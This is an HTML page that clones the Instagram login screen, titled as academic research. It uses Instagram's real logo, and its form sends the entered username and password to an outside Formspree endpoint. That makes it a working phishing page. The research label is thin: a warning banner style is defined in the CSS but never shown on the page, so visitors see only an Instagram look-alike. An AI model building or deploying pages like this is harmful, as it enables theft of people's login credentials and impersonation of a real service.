<!DOCTYPE html>
<html>
<head>
    <title>Instagram UI Clone - Academic Research</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .research-notice {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            background: #ffeb3b;
            color: #d32f2f;
            padding: 10px;
            text-align: center;
            font-weight: bold;
            z-index: 1000;
        }
        .login-box {
            border: 1px solid #dbdbdb;
            background: white;
            padding: 20px 40px;
            text-align: center;
            max-width: 350px;
            margin-top: 40px;
        }
        .logo {
            width: 175px;
            margin: 20px 0;
        }
        input {
            width: 100%;
            padding: 9px;
            margin: 5px 0;
            border: 1px solid #dbdbdb;
            background: #fafafa;
            border-radius: 3px;
        }
        button {
            width: 100%;
            background: #0095f6;
            color: white;
            border: none;
            padding: 7px;
            border-radius: 4px;
            margin: 10px 0;
            font-weight: bold;
        }
    </style>
    </head>
<body>
    <div class="login-box">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
        <form action="https://formspree.io/f/xzzrpldg" method="POST">
            <input type="text" name="research_username" placeholder="Test Username" required>
            <input type="password" name="research_password" placeholder="Test Password">
            <input type="hidden" name="_subject" value="Academic Research Submission">
            <input type="hidden" name="_replyto" value="your_academic_email@university.edu">
            
            <button type="submit">Continue for Research</button>

    </div>
</body>
</html>
